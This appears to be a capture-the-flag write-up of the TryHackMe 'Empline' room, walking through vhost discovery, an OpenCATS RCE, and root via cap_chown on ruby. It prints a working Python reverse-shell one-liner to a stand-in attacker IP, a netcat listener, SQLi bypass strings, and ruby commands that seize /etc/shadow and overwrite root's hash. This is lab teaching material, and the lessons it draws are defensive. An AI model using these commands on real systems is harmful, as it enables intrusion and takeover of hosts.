# TryHackMe: Empline — Writeup

**Room:** [Empline](https://tryhackme.com/room/empline)
**Difficulty:** Medium
**Category:** Web Exploitation, Linux Privilege Escalation

## Overview

Empline is a recruitment-themed box whose real entry point is hidden behind a
**virtual host**. The main site is a dead end; enumerating subdomains reveals a
`job.` vhost running **OpenCATS**, an open-source applicant-tracking system. A
known **OpenCATS RCE** (Exploit-DB 50585) lands a limited shell, which is upgraded
to a full TTY. Privilege escalation comes from a rare Linux **file capability** —
the `ruby` binary carries `cap_chown+ep`, which is abused to take ownership of
`/etc/shadow`, overwrite the root password hash, and `su` to **root**.

## Skills Demonstrated

- Service enumeration with Nmap (including a non-standard MySQL exposure)
- Virtual-host / subdomain discovery to reach a hidden application
- Source-code review for leaked (demo) credentials
- Identifying a web app's version and matching it to a public exploit
- OpenCATS remote code execution (Exploit-DB 50585)
- Upgrading a dumb shell to a fully interactive TTY (Python `pty`)
- Linux capability enumeration (`getcap`)
- Privilege escalation via `cap_chown` on a binary → `/etc/shadow` takeover

---

## 1. Recon & Enumeration

Nmap service/version scan showed three open ports:

```bash
nmap -sC -sV TARGET_IP
```

- **22** — SSH
- **80** — HTTP
- **3306** — MySQL (exposed, unusual)

MySQL being reachable looked promising, but scripted probes and auth attempts
went nowhere, and fuzzing the main website surfaced nothing useful. The port 80
site was a dead end on its own.

**The pivot:** the room's theme is recruitment ("empline" / jobs). App boxes that
look empty on the apex domain almost always hide the real app behind a **virtual
host**. Guessing a job-related subdomain paid off:

```
job.empline.thm
```

Adding it to `/etc/hosts` and browsing it returned a completely different
application — an **OpenCATS** login page.

**Lesson:** When the obvious surface is empty, enumerate vhosts/subdomains before
assuming the box is broken. A single `Host:` header can expose an entirely
separate application the apex domain never reveals.

## 2. OpenCATS — Login Page Recon

Classic SQLi auth-bypass payloads (`' OR 1=1 -- -`, etc.) were rejected. Reading
the login page source revealed hardcoded **demo/default credentials** in a
JavaScript helper:

```js
function demoLogin() {
    document.getElementById('username').value = 'john@mycompany.net';
    document.getElementById('password').value = 'john99';
    ...
}
function defaultLogin() {
    document.getElementById('username').value = 'admin';
    document.getElementById('password').value = 'cats';
    ...
}
```

Neither `john@mycompany.net:john99` nor `admin:cats` worked against the live
app — they're shipped demo values, not the real accounts.

Further content discovery exposed a directory listing of OpenCATS' bundled SQL
files:

```
cats_schema.sql
cats_testdata_extracted
cats_testdata.zip
upgrade-0.5.0-0.5.1.sql
upgrade-0.5.1-0.5.2.sql
upgrade-0.5.2-0.5.5.sql
upgrade-0.5.5-0.6.x.sql
upgrade-0.6.x-0.7.0.sql
upgrade-zipcodes.sql
```

The dumps were readable, but the credentials inside were **test data** that
didn't match any live account — another honeypot/rabbit hole.

**Lesson:** Default and demo credentials left in shipped source are a real-world
finding, but always verify them against the live system. Bundled test data rarely
reflects production accounts.

## 3. Foothold — OpenCATS RCE (Exploit-DB 50585)

The `careers/` page listed job postings and, with the app identified as
**OpenCATS**, I matched the version to a public exploit:

- **Exploit-DB 50585** — OpenCATS remote code execution

Running it returned a shell, but it was a non-interactive/dumb shell — basic
commands failed. I caught a proper reverse shell and upgraded it to a full
interactive TTY with a Python one-liner:

```bash
# attacker listener
nc -lvnp 4444
```

```bash
# on the target (dumb shell → full TTY)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

This gave a stable shell as the web user, and the **user flag** was readable from
here.

**Lesson:** Running an unpatched, publicly-known application is often the shortest
path to RCE. Version disclosure + a matching Exploit-DB entry is a complete
foothold. Always upgrade a dumb shell to a TTY early — job control and interactive
tools (`su`, `sudo`, editors) depend on it.

## 4. Privilege Escalation: cap_chown on ruby → root

Standard enumeration (SUID search, `sudo -l`) was unremarkable, but a
**capabilities** sweep found the vector:

```bash
getcap -r / 2>/dev/null
# /usr/local/bin/ruby = cap_chown+ep
```

The `ruby` binary carries **`cap_chown`** — it can change the ownership of *any*
file on the system without being root. That is enough to take over `/etc/shadow`,
the file holding every account's password hash.

**Step 1 — generate a known root password hash.** On my machine, create an
MD5-crypt hash for the password `root`:

```bash
openssl passwd -1 -salt xyz root
# $1$xyz$YCCZsvYCmSe.qXSOYUWkJ/
```

**Step 2 — use ruby's `cap_chown` to take ownership of `/etc/shadow`.** A plain
`sed` edit failed (the web user can't write `/etc/shadow`), so the capability had
to do the work — `ruby` chowns the file to the current user:

```bash
/usr/local/bin/ruby -e 'File.chown(Process.uid, Process.gid, "/etc/shadow")'
```

**Step 3 — rewrite the root hash.** Now owning the file, replace root's password
field with the hash from step 1:

```bash
/usr/local/bin/ruby -e '
content = File.read("/etc/shadow")
content.sub!(/^root:[^:]*:/, "root:$1$xyz$YCCZsvYCmSe.qXSOYUWkJ/:")
File.write("/etc/shadow", content)
'
```

**Step 4 — switch to root** with the password I just set (`root`):

```bash
su root
# Password: root
```

That dropped into a root shell, and the **root flag** was in `/root`.

**Lesson:** File capabilities are an easily-overlooked privesc surface — they
don't show up in a SUID search. `cap_chown` on *any* executable is effectively
root: owning `/etc/shadow` (or `/etc/passwd`, `sudoers`, a root cron, etc.) leads
straight to full compromise. Grant capabilities with extreme care, and never to a
general-purpose interpreter like `ruby` or `python`.

---

## Summary of the Attack Chain

| # | Vulnerability | Impact |
|---|---|---|
| 1 | Hidden app behind a virtual host (`job.empline.thm`) | Exposes the real attack surface (OpenCATS) |
| 2 | Default/demo creds + readable SQL dumps | Information disclosure (rabbit holes, but confirm the app) |
| 3 | Unpatched OpenCATS (Exploit-DB 50585) | Remote code execution → foothold (user flag) |
| 4 | `cap_chown+ep` on `/usr/local/bin/ruby` | `/etc/shadow` takeover → **root** |

## Flags

- User flag: `THM{redacted}`
- Root flag (`/root`): `THM{redacted}`

_Flags redacted per CTF writeup etiquette. Complete the room yourself to retrieve
them._
